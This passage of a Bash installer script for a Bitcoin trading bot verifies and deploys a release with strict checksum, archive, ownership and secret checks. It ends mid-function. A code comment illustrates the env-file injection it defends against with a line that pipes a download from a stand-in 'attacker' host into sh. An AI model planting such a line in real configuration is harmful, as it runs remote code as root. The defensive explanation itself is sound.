#!/usr/bin/env bash
# Verify, install and health-gate one immutable Bitcoin Bot release artifact.
set -Eeuo pipefail

ARTIFACT=${1:?usage: install_artifact.sh RELEASE.tar.gz RELEASE.tar.gz.sha256}
CHECKSUM=${2:?usage: install_artifact.sh RELEASE.tar.gz RELEASE.tar.gz.sha256}
APP_ROOT=/opt/bitcoin-bot
RELEASES=$APP_ROOT/releases
CURRENT=$APP_ROOT/current
PERSIST_PARENT=/var/lib/bitcoin-bot
PERSIST=/var/lib/bitcoin-bot/shared
CONFIG_ROOT=/var/lib/bitcoin-bot/config-snapshots
PRIVATE_ROOT=/etc/bitcoin-bot
ENV_FILE=$PRIVATE_ROOT/.env
KEEP_RELEASES=${KEEP_RELEASES:-3}
MIN_PHYSICAL_MEMORY_MIB=${MIN_PHYSICAL_MEMORY_MIB:-1400}
MIN_SWAP_MEMORY_MIB=${MIN_SWAP_MEMORY_MIB:-3800}
MAX_ARCHIVE_CONTENT_MIB=${MAX_ARCHIVE_CONTENT_MIB:-1024}
LIVE_PREFLIGHT_MARGIN_SECONDS=3600
LIVE_ACTIVATION_MARGIN_SECONDS=300
EXPECTED_SERVICES=(moneyflow freqtrade execution-sidecar telegram-broker)
export COMPOSE_PROJECT_NAME=bitcoin-bot

fail(){ echo "ERROR: $*" >&2; exit 1; }
as_root(){ if [[ $EUID -eq 0 ]]; then "$@"; else sudo -n "$@"; fi; }

# >>> BEGIN INLINED deploy/lib/envfile.sh (do not edit; see that file) >>>
# Strict, non-evaluating reader for KEY=VALUE environment files.
#
# WHY THIS EXISTS
#
# The privileged installers previously did:
#
#     set -a
#     source "$ENV_FILE"
#     set +a
#
# `source` makes Bash *interpret* the file. Every value is shell code, so a
# single line such as
#
#     COMMAND_HMAC_KEY=$(curl -s http://attacker/x | sh)
#
# executes as whatever user runs the installer. install_artifact.sh and
# install_monitoring.sh escalate through `as_root`, so that is root.
#
# The old mode check (`stat -c '%a' == 600`) constrained permissions but never
# ownership, and the rollback path sourced configuration snapshots under
# /var/lib/bitcoin-bot/config-snapshots, which oracle_setup.sh chowns to the
# unprivileged deployment user. Anyone able to write a snapshot could therefore
# execute arbitrary code as root during the next upgrade or rollback.
#
# These helpers never evaluate a value. Assignment uses `printf -v`, which
# writes the bytes literally, and every key is validated against a strict
# identifier pattern before it is used as a variable name.
#
# Regression coverage: tests/test_env_file_parser.py

env_file_fail() { echo "ERROR: $*" >&2; return 1; }

# env_file_require_trusted FILE
#
# A file that a privileged process is about to read must be a real file, not a
# symlink, owned by root, and not writable by group or other.
env_file_require_trusted() {
  local file=$1 owner mode
  [[ -f "$file" && ! -L "$file" ]] || {
    env_file_fail "environment file is missing or a symlink: $file"; return 1; }
  owner=$(stat -c '%u' "$file" 2>/dev/null) || {
    env_file_fail "cannot stat environment file: $file"; return 1; }
  [[ "$owner" == "0" ]] || {
    env_file_fail "environment file must be owned by root (uid 0), found uid $owner: $file"
    return 1; }
  mode=$(stat -c '%a' "$file" 2>/dev/null)
  mode=${mode: -3}
  case "$mode" in
    600|640|400|440) ;;
    *) env_file_fail "environment file must not be group- or world-writable (mode $mode): $file"
       return 1 ;;
  esac
  return 0
}

# _env_file_unquote NAME
#
# Strips one balanced layer of single or double quotes. Nothing is expanded.
_env_file_unquote() {
  local __name=$1 __v=${!1}
  if [[ ${#__v} -ge 2 ]]; then
    if [[ ${__v:0:1} == '"' && ${__v: -1} == '"' ]]; then
      __v=${__v:1:${#__v}-2}
    elif [[ ${__v:0:1} == "'" && ${__v: -1} == "'" ]]; then
      __v=${__v:1:${#__v}-2}
    fi
  fi
  printf -v "$__name" '%s' "$__v"
}

# env_file_get FILE KEY
#
# Prints the literal value of KEY, or returns 1 when absent. The last
# assignment wins, matching how `source` behaved for duplicate keys.
env_file_get() {
  local file=$1 want=$2 line key value found=1 result=''
  [[ "$want" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || {
    env_file_fail "invalid environment key requested: $want"; return 1; }
  while IFS= read -r line || [[ -n "$line" ]]; do
    line=${line%$'\r'}
    line=${line#"${line%%[![:space:]]*}"}
    [[ -z "$line" || "$line" == '#'* ]] && continue
    [[ "$line" == *=* ]] || continue
    key=${line%%=*}
    key=${key%"${key##*[![:space:]]}"}
    [[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || continue
    [[ "$key" == "$want" ]] || continue
    value=${line#*=}
    _env_file_unquote value
    result=$value
    found=0
  done < "$file"
  [[ $found -eq 0 ]] || return 1
  printf '%s' "$result"
  return 0
}

# env_file_pairs FILE
#
# Emits NUL-separated KEY=VALUE records for use as literal `env` arguments:
#
#     while IFS= read -r -d '' kv; do args+=("$kv"); done < <(env_file_pairs f)
#     env -i "${args[@]}" some-command
#
# `env` treats each argument as data, so this replaces `set -a; source FILE`
# inside a clean-environment subshell without ever evaluating a value.
env_file_pairs() {
  local file=$1 line key value lineno=0
  while IFS= read -r line || [[ -n "$line" ]]; do
    lineno=$((lineno + 1))
    line=${line%$'\r'}
    line=${line#"${line%%[![:space:]]*}"}
    [[ -z "$line" || "$line" == '#'* ]] && continue
    [[ "$line" == *=* ]] || {
      env_file_fail "$file line $lineno is not KEY=VALUE"; return 1; }
    key=${line%%=*}
    key=${key%"${key##*[![:space:]]}"}
    [[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || {
      env_file_fail "$file line $lineno has an invalid key name"; return 1; }
    value=${line#*=}
    _env_file_unquote value
    printf '%s=%s\0' "$key" "$value"
  done < "$file"
  return 0
}

# env_file_load FILE
#
# Exports every well-formed KEY=VALUE pair, literally. A malformed key is
# rejected outright rather than skipped, so a corrupt or tampered file fails
# closed instead of silently loading a partial configuration.
env_file_load() {
  local file=$1 line key value lineno=0
  while IFS= read -r line || [[ -n "$line" ]]; do
    lineno=$((lineno + 1))
    line=${line%$'\r'}
    line=${line#"${line%%[![:space:]]*}"}
    [[ -z "$line" || "$line" == '#'* ]] && continue
    [[ "$line" == *=* ]] || {
      env_file_fail "$file line $lineno is not KEY=VALUE"; return 1; }
    key=${line%%=*}
    key=${key%"${key##*[![:space:]]}"}
    [[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || {
      env_file_fail "$file line $lineno has an invalid key name"; return 1; }
    value=${line#*=}
    _env_file_unquote value
    printf -v "$key" '%s' "$value"
    export "${key?}"
  done < "$file"
  return 0
}
# <<< END INLINED deploy/lib/envfile.sh <<<
require_canonical_dir(){
  local path=$1 uid=$2 gid=$3 mode=$4 resolved
  [[ -d "$path" && ! -L "$path" ]] || fail "required directory is missing or a symlink: $path"
  resolved=$(readlink -f "$path" 2>/dev/null || true)
  [[ "$resolved" == "$path" ]] || fail "required directory is not canonical: $path"
  [[ $(stat -c '%u' "$path") == "$uid" && $(stat -c '%g' "$path") == "$gid" ]] || \
    fail "required directory has unsafe ownership: $path"
  [[ $(stat -c '%a' "$path") == "$mode" ]] || fail "required directory has unsafe mode: $path"
}
is_timestamp_release_dir(){
  local path=$1 resolved base parent
  [[ -d "$path" && ! -L "$path" ]] || return 1
  resolved=$(readlink -f "$path" 2>/dev/null || true)
  [[ -n "$resolved" && "$resolved" == "$path" ]] || return 1
  parent=$(dirname "$resolved")
  base=$(basename "$resolved")
  [[ "$parent" == "$RELEASES" && "$base" =~ ^[0-9]{8}T[0-9]{6}Z$ ]]
}
require_release_config(){
  local release_dir=$1 config=$2 expected resolved
  is_timestamp_release_dir "$release_dir" || return 1
  expected="$CONFIG_ROOT/$(basename "$release_dir").env"
  [[ "$config" == "$expected" && -f "$config" && ! -L "$config" ]] || return 1
  resolved=$(readlink -f "$config" 2>/dev/null || true)
  [[ "$resolved" == "$config" && $(dirname "$resolved") == "$CONFIG_ROOT" ]] || return 1
  [[ $(stat -c '%u' "$config") == "$BOT_UID" \
     && $(stat -c '%g' "$config") == "$BOT_GID" \
     && $(stat -c '%a' "$config") == 600 ]]
}
project_empty(){
  local ids
  ids=$(docker ps -aq --filter "label=com.docker.compose.project=$COMPOSE_PROJECT_NAME" 2>/dev/null) || return 1
  [[ -z "$ids" ]]
}
switch_current(){
  local target=$1
  as_root ln -sfn "$target" "$CURRENT.new"
  as_root mv -Tf "$CURRENT.new" "$CURRENT"
}
clear_current(){ as_root rm -f -- "$CURRENT" "$CURRENT.new"; }
[[ "$KEEP_RELEASES" =~ ^[1-9][0-9]*$ ]] || fail 'KEEP_RELEASES must be a positive integer'

ARTIFACT=$(readlink -f "$ARTIFACT" 2>/dev/null || true)
CHECKSUM=$(readlink -f "$CHECKSUM" 2>/dev/null || true)
[[ -f "$ARTIFACT" && -f "$CHECKSUM" ]] || fail 'artifact/checksum missing'
[[ -f "$ENV_FILE" ]] || fail "private env missing: $ENV_FILE"
[[ $(stat -c '%a' "$ENV_FILE") == 600 ]] || fail "$ENV_FILE must be mode 600"

# A single fixed Compose project plus an exclusive host lock prevents two
# releases from concurrently owning the same Binance account.
LOCK_FILE=/var/lock/bitcoin-bot.install.lock
exec 9>"$LOCK_FILE" || fail "cannot open deployment lock $LOCK_FILE; run oracle_setup.sh first"
flock -n 9 || fail "another install holds $LOCK_FILE"

# Parsed as literal data. `source` would execute every value as shell
# code with root privileges; see deploy/lib/envfile.sh.
env_file_require_trusted "$ENV_FILE" || \
  fail "$ENV_FILE must be a regular root-owned file that is not group- or world-writable"
env_file_load "$ENV_FILE" || fail "$ENV_FILE is not a valid KEY=VALUE environment file"

placeholder(){
  local upper=${1^^}
  [[ -z "$upper" || "$upper" == *REPLACE* || "$upper" == *CHANGEME* \
     || "$upper" == *CHANGE_ME* || "$upper" == *GENERATE* || "$upper" == *EXAMPLE* ]]
}
require_secret(){
  local name=$1 minimum=$2 value=${!1:-}
  [[ ${#value} -ge $minimum ]] || fail "$name must contain at least $minimum characters"
  ! placeholder "$value" || fail "$name still contains a public placeholder"
}

EXECUTION_MODE=${EXECUTION_MODE:-simulation}
case "$EXECUTION_MODE" in
  simulation|testnet|live) ;;
  *) fail 'EXECUTION_MODE must be simulation, testnet, or live' ;;
esac
if [[ -n "${EXPECTED_EXECUTION_MODE:-}" && "$EXECUTION_MODE" != "$EXPECTED_EXECUTION_MODE" ]]; then
  fail "host EXECUTION_MODE=$EXECUTION_MODE does not match requested $EXPECTED_EXECUTION_MODE"
fi
require_secret SIGNAL_HMAC_KEY 32
require_secret COMMAND_HMAC_KEY 32
require_secret FREQTRADE_API_PASSWORD 24
require_secret FREQTRADE_API_JWT_SECRET 32
require_secret FREQTRADE_API_WS_TOKEN 32
[[ "$SIGNAL_HMAC_KEY" != "$COMMAND_HMAC_KEY" ]] || fail 'signal and command bus keys must be different'
[[ "$FREQTRADE_API_PASSWORD" != "$FREQTRADE_API_JWT_SECRET" \
   && "$FREQTRADE_API_PASSWORD" != "$FREQTRADE_API_WS_TOKEN" \
   && "$FREQTRADE_API_JWT_SECRET" != "$FREQTRADE_API_WS_TOKEN" ]] || \
  fail 'Freqtrade API password/JWT/WebSocket secrets must be independent'
[[ "$SIGNAL_HMAC_KEY" != "$FREQTRADE_API_JWT_SECRET" \
   && "$COMMAND_HMAC_KEY" != "$FREQTRADE_API_WS_TOKEN" ]] || \
  fail 'service-bus and Freqtrade secrets must be independently generated'
require_secret TELEGRAM_BOT_TOKEN 24
[[ "$TELEGRAM_BOT_TOKEN" =~ ^[0-9]+:[A-Za-z0-9_-]{20,}$ ]] || fail 'TELEGRAM_BOT_TOKEN has invalid BotFather format'
[[ "${TELEGRAM_OWNER_CHAT_ID:-}" =~ ^-?[0-9]+$ ]] || fail 'TELEGRAM_OWNER_CHAT_ID must be numeric'
COINGECKO_CONTEXT_ENABLED=${COINGECKO_CONTEXT_ENABLED:-false}
COINMARKETCAP_CONTEXT_ENABLED=${COINMARKETCAP_CONTEXT_ENABLED:-false}
case "$COINGECKO_CONTEXT_ENABLED" in true|false) ;; *) fail 'COINGECKO_CONTEXT_ENABLED must be true or false' ;; esac
case "$COINMARKETCAP_CONTEXT_ENABLED" in true|false) ;; *) fail 'COINMARKETCAP_CONTEXT_ENABLED must be true or false' ;; esac
if [[ "$COINGECKO_CONTEXT_ENABLED" == true ]]; then
  require_secret COINGECKO_API_KEY 16
fi
if [[ "$COINMARKETCAP_CONTEXT_ENABLED" == true ]]; then
  require_secret COINMARKETCAP_API_KEY 16
fi
bounded_provider_cap(){
  local name=$1 maximum=$2 value=${!1:-$2}
  [[ "$value" =~ ^[1-9][0-9]*$ && "$value" -le "$maximum" ]] || \
    fail "$name must be an integer from 1 through $maximum"
}
bounded_provider_cap COINGECKO_MAX_REQUESTS_PER_MINUTE 96
bounded_provider_cap COINGECKO_MAX_MONTHLY_ATTEMPTS 9600
bounded_provider_cap COINMARKETCAP_MAX_REQUESTS_PER_MINUTE 28
bounded_provider_cap COINMARKETCAP_MAX_MONTHLY_ATTEMPTS 9600
EXTERNAL_MARKET_REFRESH_SECONDS=${EXTERNAL_MARKET_REFRESH_SECONDS:-300}
[[ "$EXTERNAL_MARKET_REFRESH_SECONDS" =~ ^[0-9]+$ \
   && "$EXTERNAL_MARKET_REFRESH_SECONDS" -ge 300 ]] || \
  fail 'EXTERNAL_MARKET_REFRESH_SECONDS must be at least 300'
if [[ "$EXECUTION_MODE" != simulation ]]; then
  [[ -n "${BINANCE_API_KEY:-}" && -n "${BINANCE_API_SECRET:-}" ]] || \
    fail "$EXECUTION_MODE requires Binance API credentials"
  ! placeholder "$BINANCE_API_KEY" && ! placeholder "$BINANCE_API_SECRET" || \
    fail 'Binance credentials still contain placeholders'
fi
if [[ "$EXECUTION_MODE" == live ]]; then
  [[ "${LIVE_TRADING_ENABLED:-false}" == true ]] || fail 'live requires LIVE_TRADING_ENABLED=true'
  [[ "${AUTO_CONFIRM:-false}" == false ]] || fail 'live requires AUTO_CONFIRM=false and manual owner resume'
  [[ -n "${LIVE_EVIDENCE_PUBLIC_KEY:-}" ]] || fail 'live requires LIVE_EVIDENCE_PUBLIC_KEY'
  ! placeholder "$LIVE_EVIDENCE_PUBLIC_KEY" || fail 'LIVE_EVIDENCE_PUBLIC_KEY still contains a public placeholder'
  python3 -c 'from Crypto.PublicKey import ECC' 2>/dev/null || \
    fail 'host live verifier dependency missing; rerun deploy/oracle_setup.sh'
fi

if [[ $EUID -ne 0 ]]; then
  command -v sudo >/dev/null 2>&1 || fail 'sudo is required for an unprivileged deployment user'
  sudo -n true || fail 'passwordless sudo is required before the transactional cutover'
fi

BOT_UID=${BOT_UID:-$(id -u)}
BOT_GID=${BOT_GID:-$(id -g)}
[[ "$BOT_UID" =~ ^[0-9]+$ && "$BOT_GID" =~ ^[0-9]+$ ]] || fail 'BOT_UID/BOT_GID must be numeric'
if [[ $EUID -ne 0 ]]; then
  [[ $(id -u) == "$BOT_UID" && $(id -g) == "$BOT_GID" ]] || \
    fail 'unprivileged installer UID/GID must exactly match BOT_UID/BOT_GID'
fi
require_canonical_dir "$APP_ROOT" 0 0 755
require_canonical_dir "$PERSIST_PARENT" 0 0 755
require_canonical_dir "$RELEASES" "$BOT_UID" "$BOT_GID" 755
require_canonical_dir "$PERSIST" "$BOT_UID" "$BOT_GID" 750
require_canonical_dir "$CONFIG_ROOT" "$BOT_UID" "$BOT_GID" 700
require_canonical_dir "$PRIVATE_ROOT" 0 "$BOT_GID" 750
[[ ! -L "$ENV_FILE" && $(stat -c '%u' "$ENV_FILE") == "$BOT_UID" \
   && $(stat -c '%g' "$ENV_FILE") == "$BOT_GID" ]] || \
  fail "$ENV_FILE must be a regular deployment-user-owned file"
[[ ! -e "$CURRENT" || -L "$CURRENT" ]] || fail "$CURRENT exists but is not a symlink"
[[ "${SHARED_HOST_PATH:-}" == "$PERSIST" ]] || fail "SHARED_HOST_PATH must equal $PERSIST"
SHARED_DIRS=(
  "$PERSIST/audit"
  "$PERSIST/command_results"
  "$PERSIST/commands"
  "$PERSIST/commands/inbox"
  "$PERSIST/commands/processed"
  "$PERSIST/freqtrade"
  "$PERSIST/freqtrade/logs"
  "$PERSIST/moneyflow"
  "$PERSIST/moneyflow/history"
  "$PERSIST/pair"
  "$PERSIST/runtime"
  "$PERSIST/runtime/moneyflow"
  "$PERSIST/runtime/sidecar"
  "$PERSIST/runtime/sidecar/backtests"
  "$PERSIST/runtime/telegram"
  "$PERSIST/signals"
  "$PERSIST/signals/inbox"
  "$PERSIST/signals/processed"
  "$PERSIST/signals/rejected"
)
for shared_dir in "${SHARED_DIRS[@]}"; do
  [[ ! -L "$shared_dir" ]] || fail "persistent path is a symlink: $shared_dir"
done
mkdir -p "${SHARED_DIRS[@]}"
chmod 0750 "${SHARED_DIRS[@]}"
for shared_dir in "${SHARED_DIRS[@]}"; do
  require_canonical_dir "$shared_dir" "$BOT_UID" "$BOT_GID" 750
done

physical_mib=$(awk '/MemTotal/{print int($2/1024)}' /proc/meminfo)
swap_mib=$(awk '/SwapTotal/{print int($2/1024)}' /proc/meminfo)
(( physical_mib >= MIN_PHYSICAL_MEMORY_MIB )) || \
  fail "physical memory ${physical_mib} MiB is below ${MIN_PHYSICAL_MEMORY_MIB} MiB"
(( swap_mib >= MIN_SWAP_MEMORY_MIB )) || \
  fail "swap ${swap_mib} MiB is below ${MIN_SWAP_MEMORY_MIB} MiB; run oracle_setup.sh"
systemctl is-active --quiet chrony || fail 'chrony is not active; reliable clocks are required'
chrony_tracking=$(chronyc tracking) || fail 'chrony cannot report clock status'
grep -Eq '^Leap status[[:space:]]*:[[:space:]]*Normal' <<<"$chrony_tracking" || \
  fail 'chrony is active but not synchronized; wait for clock sync before deployment'

# The checksum file supplies only a digest. It is never allowed to select an
# arbitrary path for sha256sum.
EXPECTED=$(awk 'NF{print $1;exit}' "$CHECKSUM")
[[ "$EXPECTED" =~ ^[0-9a-fA-F]{64}$ ]] || fail 'invalid checksum file'
ACTUAL=$(sha256sum "$ARTIFACT" | awk '{print $1}')
[[ "${ACTUAL,,}" == "${EXPECTED,,}" ]] || fail 'artifact checksum mismatch'

# Reject traversal, links/devices, duplicate names, multiple roots and archive
# bombs before tar sees the destination directory.
python3 - "$ARTIFACT" "$MAX_ARCHIVE_CONTENT_MIB" <<'PY'
import pathlib
import sys
import tarfile

archive_path = sys.argv[1]
maximum = int(sys.argv[2]) * 1024 * 1024
roots = set()
seen = set()
expanded = 0
with tarfile.open(archive_path, 'r:*') as archive:
    members = archive.getmembers()
    if not members:
        raise SystemExit('empty archive')
    for member in members:
        name = member.name
        if '\\' in name or '\x00' in name:
            raise SystemExit('unsafe archive member name: ' + repr(name))
        pure = pathlib.PurePosixPath(name)
        if pure.is_absolute() or '..' in pure.parts:
            raise SystemExit('unsafe archive member: ' + name)
        normal = pure.as_posix().rstrip('/')
        if normal in seen:
            raise SystemExit('duplicate archive member: ' + name)
        seen.add(normal)
        if member.issym() or member.islnk() or member.isdev() or member.isfifo():
            raise SystemExit('unsupported archive member type: ' + name)
        if not (member.isfile() or member.isdir()):
            raise SystemExit('unsupported archive member: ' + name)
        expanded += max(0, member.size)
        if expanded > maximum:
            raise SystemExit('archive expanded size exceeds configured limit')
        if pure.parts and pure.parts[0] not in ('.', ''):
            roots.add(pure.parts[0])
if roots != {'bitcoin-bot'}:
    raise SystemExit('archive must contain exactly the bitcoin-bot top-level directory')
print('archive structure safe')
PY

STAMP=$(date -u +%Y%m%dT%H%M%SZ)

# Remove only abandoned extractor directories created by this installer. They
# are never valid releases and must not consume a rollback-retention slot.
while IFS= read -r abandoned; do
  resolved=$(readlink -f "$abandoned" || true)
  [[ -n "$resolved" && "$resolved" == "$abandoned" \
     && $(dirname "$resolved") == "$RELEASES" \
     && $(basename "$resolved") == .extract.* ]] || \
    fail "unsafe abandoned extraction target: $abandoned"
  rm -rf --one-file-system -- "$resolved"
  [[ ! -e "$resolved" ]] || fail "abandoned extraction contains a nested mount: $resolved"
done < <(find "$RELEASES" -mindepth 1 -maxdepth 1 -type d -name '.extract.*' -print)

TMP=$(mktemp -d "$RELEASES/.extract.XXXXXX")
NEW_CONFIG=''
DEST=''
CONFIG_COMMITTED=false
PRESERVE_FAILED_RELEASE=false
NEW_PROJECT_ATTEMPTED=false
NEW_TAG=''
cleanup(){
  rm -rf --one-file-system -- "$TMP" 2>/dev/null || true
  if [[ "$CONFIG_COMMITTED" != true && "$PRESERVE_FAILED_RELEASE" != true \
     && -n "$DEST" ]] && is_timestamp_release_dir "$DEST"; then
    active_cleanup=$(readlink -f "$CURRENT" 2>/dev/null || true)
    if [[ "$active_cleanup" == "$DEST" ]]; then
      PRESERVE_FAILED_RELEASE=true
      echo "WARNING: uncommitted release is still current; preserving its release and config: $DEST" >&2
    else
      rm -rf --one-file-system -- "$DEST" 2>/dev/null || true
      if [[ -e "$DEST" ]]; then
        PRESERVE_FAILED_RELEASE=true
        echo "WARNING: failed release contains a nested mount or could not be removed; preserving its config: $DEST" >&2
      fi
    fi
  fi
  if [[ "$CONFIG_COMMITTED" != true && "$PRESERVE_FAILED_RELEASE" != true \
     && -n "$NEW_CONFIG" && -f "$NEW_CONFIG" && ! -L "$NEW_CONFIG" \
     && $(dirname "$NEW_CONFIG") == "$CONFIG_ROOT" ]]; then
    rm -f -- "$NEW_CONFIG"
    if [[ -n "$DEST" ]]; then
      rm -f -- "$CONFIG_ROOT/$(basename "$DEST").success"
    fi
  fi
  if [[ "$CONFIG_COMMITTED" != true && "$PRESERVE_FAILED_RELEASE" != true \
     && -n "$NEW_TAG" ]]; then
    image_users=$(docker ps -aq --filter "ancestor=bitcoin-bot-services:$NEW_TAG" 2>/dev/null || true)
    [[ -n "$image_users" ]] || docker image rm "bitcoin-bot-services:$NEW_TAG" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT
tar -xzf "$ARTIFACT" -C "$TMP" --no-same-owner --no-same-permissions
NEW="$TMP/bitcoin-bot"
[[ -d "$NEW" && -f "$NEW/RELEASE_MANIFEST.json" && -f "$NEW/RELEASE_SHA256.txt" \
   && -f "$NEW/RELEASE_MODE" ]] || fail 'invalid release root'
python3 "$NEW/scripts/verify_manifest.py"
python3 "$NEW/tests/secret_scan.py"
RELEASE_HASH=$(awk 'NF{print $1;exit}' "$NEW/RELEASE_SHA256.txt")
[[ "$RELEASE_HASH" =~ ^[0-9a-f]{64}$ ]] || fail 'invalid release hash'
PACKAGE_MODE=$(<"$NEW/RELEASE_MODE")
export PACKAGE_MODE
case "$PACKAGE_MODE" in
  live) [[ "$EXECUTION_MODE" == simulation || "$EXECUTION_MODE" == live ]] \
          || fail 'live package permits only simulation or live execution' ;;
  testnet) [[ "$EXECUTION_MODE" == simulation || "$EXECUTION_MODE" == testnet ]] \
             || fail 'testnet package permits only simulation or testnet execution' ;;
  *) fail 'artifact RELEASE_MODE must be live or testnet' ;;
esac
NEW_TAG="bitcoin-${RELEASE_HASH:0:16}"
NEW_CONFIG="$CONFIG_ROOT/$STAMP.env"
[[ ! -e "$NEW_CONFIG" ]] || fail "config snapshot already exists: $NEW_CONFIG"
as_root install -m 0600 -o "$BOT_UID" -g "$BOT_GID" "$ENV_FILE" "$NEW_CONFIG"

# The sidecar is the only runtime pair writer. On first install, build all
# three projections from ACTIVE_PAIR. On repair, the existing authoritative
# state may reconstruct a missing projection, but an existing mismatch is a
# hard failure and an operator-selected pair is never overwritten.
PYTHONPATH="$NEW" python3 - "$PERSIST/pair" <<'PY'
from datetime import datetime, timezone
import json
import os
from pathlib import Path
import sys
from services.common.atomic import atomic_write_json
from services.common.market_policy import (
    allowed_quotes_from_env,
    canonical_pair,
    pair_config_hash,
    pair_state_hash,
    quote_for_pair,
    symbol_for_pair,
)

root = Path(sys.argv[1])
active_path = root / 'active_pair.json'
pairlist_path = root / 'current_pairlist.json'
overlay_path = root / 'freqtrade-active.json'
present = [path.is_file() for path in (active_path, pairlist_path, overlay_path)]
if any(path.is_symlink() for path in (active_path, pairlist_path, overlay_path)):
    raise SystemExit('persistent pair projections must not be symlinks')
quotes = allowed_quotes_from_env()

if not any(present):
    pair = canonical_pair(os.environ.get('ACTIVE_PAIR', 'BTC/USDT'), quotes)
    state = {
        'schema_version': 1,
        'pair': pair,
        'symbol': symbol_for_pair(pair, quotes),
        'base': 'BTC',
        'quote': quote_for_pair(pair, quotes),
        'generation': 1,
        'updated_at': datetime.now(timezone.utc).isoformat(),
        'source': 'installer-bootstrap',
    }
    state['pair_config_hash'] = pair_config_hash(pair, quotes)
    state['state_hash'] = pair_state_hash(state)
else:
    if not present[0]:
        raise SystemExit('authoritative active_pair.json is missing; refusing ambiguous projection recovery')
    state = json.loads(active_path.read_text(encoding='utf-8'))

if not isinstance(state, dict) or state.get('schema_version') != 1:
    raise SystemExit('persistent active pair schema is invalid')
pair = canonical_pair(str(state.get('pair', '')), quotes)
quote = quote_for_pair(pair, quotes)
if (state.get('pair') != pair or state.get('symbol') != symbol_for_pair(pair, quotes)
        or state.get('base') != 'BTC' or state.get('quote') != quote
        or not isinstance(state.get('generation'), int) or state['generation'] < 1
        or state.get('pair_config_hash') != pair_config_hash(pair, quotes)
        or state.get('state_hash') != pair_state_hash(state)):
    raise SystemExit('persistent active pair state is inconsistent or has an invalid hash')

expected_pairlist = {
    'pairs': [pair], 'refresh_period': 10, 'pair_state_hash': state['state_hash'],
    'pair_config_hash': state['pair_config_hash'],
}
expected_overlay = {
    'stake_currency': quote,
    'exchange': {'pair_whitelist': [pair], 'pair_blacklist': []},
}
for path, expected, existed in (
    (pairlist_path, expected_pairlist, present[1]),
    (overlay_path, expected_overlay, present[2]),
):
    if existed:
        actual = json.loads(path.read_text(encoding='utf-8'))
        if actual != expected:
            raise SystemExit(f'{path.name} conflicts with authoritative active pair state')
    else:
        atomic_write_json(path, expected)
if not present[0]:
    atomic_write_json(active_path, state)
print('persistent BTC pair projections validated:', pair)
PY
as_root chown "$BOT_UID:$BOT_GID" \
  "$PERSIST/pair/active_pair.json" \
  "$PERSIST/pair/current_pairlist.json" \
  "$PERSIST/pair/freqtrade-active.json"
as_root chmod 0640 \
  "$PERSIST/pair/active_pair.json" \
  "$PERSIST/pair/current_pairlist.json" \
  "$PERSIST/pair/freqtrade-active.json"

verify_live_candidate(){
  local release_dir=$1 release_hash=$2 release_env=$3 minimum_remaining=$4
  local source="$PERSIST/runtime/sidecar/LIVE_EVIDENCE.${release_hash}.json"
  [[ "$release_hash" =~ ^[0-9a-f]{64}$ \
     && "$minimum_remaining" =~ ^[1-9][0-9]*$ ]] || return 1
  [[ -d "$release_dir" && ! -L "$release_dir" \
     && -f "$release_env" && ! -L "$release_env" \
     && -f "$source" && ! -L "$source" ]] || return 1
  # The release env is converted to literal `env` arguments rather than
  # sourced, so no value is ever interpreted as shell code. Explicit
  # assignments follow the file so they still win on duplicate keys.
  local -a release_env_pairs=()
  local _kv
  env_file_pairs "$release_env" >/dev/null || return 1
  while IFS= read -r -d '' _kv; do
    release_env_pairs+=("$_kv")
  done < <(env_file_pairs "$release_env")
  env -i "PATH=$PATH" "HOME=${HOME:-/tmp}" "${release_env_pairs[@]}" \
    "PYTHONPATH=$release_dir" \
    "SHARED_ROOT=$PERSIST" \
    "RUNTIME_DIR=$PERSIST/runtime/sidecar" \
    "ACTIVE_PAIR_FILE=$PERSIST/pair/active_pair.json" \
    "ENVELOPE_RELEASE_HASH=$release_hash" \
    "LIVE_EVIDENCE_FILE=$source" \
    "LIVE_EVIDENCE_MIN_REMAINING_SECONDS=$minimum_remaining" \
    python3 "$release_dir/scripts/verify_live_evidence.py" "$source"
}

if [[ "$EXECUTION_MODE" == live ]]; then
  verify_live_candidate "$NEW" "$RELEASE_HASH" "$NEW_CONFIG" \
    "$LIVE_PREFLIGHT_MARGIN_SECONDS" || \
    fail 'new signed live evidence failed the one-hour preflight validity gate'
fi

activate_live_evidence(){
  local release_dir=$1 release_hash=$2 release_env=$3
  local source="$PERSIST/runtime/sidecar/LIVE_EVIDENCE.${release_hash}.json"
  local target="$PERSIST/runtime/sidecar/LIVE_EVIDENCE.json"
  verify_live_candidate "$release_dir" "$release_hash" "$release_env" \
    "$LIVE_ACTIVATION_MARGIN_SECONDS" || return 1
  [[ -f "$source" && ! -L "$source" ]] || return 1
  python3 - "$source" "$target" "$BOT_UID" "$BOT_GID" <<'PY'
import os
from pathlib import Path
import sys
import tempfile

source, target = Path(sys.argv[1]), Path(sys.argv[2])
uid, gid = int(sys.argv[3]), int(sys.argv[4])
if source.is_symlink() or not source.is_file() or source.stat().st_size > 256 * 1024:
    raise SystemExit('unsafe live-evidence candidate')
data = source.read_bytes()
fd, temporary = tempfile.mkstemp(prefix='.LIVE_EVIDENCE.', suffix='.tmp', dir=target.parent)
try:
    with os.fdopen(fd, 'wb') as handle:
        handle.write(data)
        handle.flush()
        os.fsync(handle.fileno())
    os.chmod(temporary, 0o640)
    if os.geteuid() == 0:
        os.chown(temporary, uid, gid)
    elif os.geteuid() != uid or os.getegid() != gid:
        raise PermissionError('installer identity differs from BOT_UID/BOT_GID')
    os.replace(temporary, target)
    directory = os.open(target.parent, os.O_RDONLY | getattr(os, 'O_DIRECTORY', 0))
    try:
        os.fsync(directory)
    finally:
        os.close(directory)
finally:
    try:
        os.unlink(temporary)
    except FileNotFoundError:
        pass
PY
}

compose_for(){
  local release_dir=$1 release_hash=$2 release_tag=$3
  shift 3
  local release_env config_hash
  if [[ "$release_dir" == "$NEW" ]]; then
    release_env=$NEW_CONFIG
    [[ -f "$release_env" && ! -L "$release_env" \
       && $(stat -c '%u' "$release_env") == "$BOT_UID" \
       && $(stat -c '%g' "$release_env") == "$BOT_GID" \
       && $(stat -c '%a' "$release_env") == 600 ]] || {
      echo "new release config snapshot is unsafe" >&2
      return 1
    }
  else
    release_env="$CONFIG_ROOT/$(basename "$release_dir").env"
    require_release_config "$release_dir" "$release_env" || {
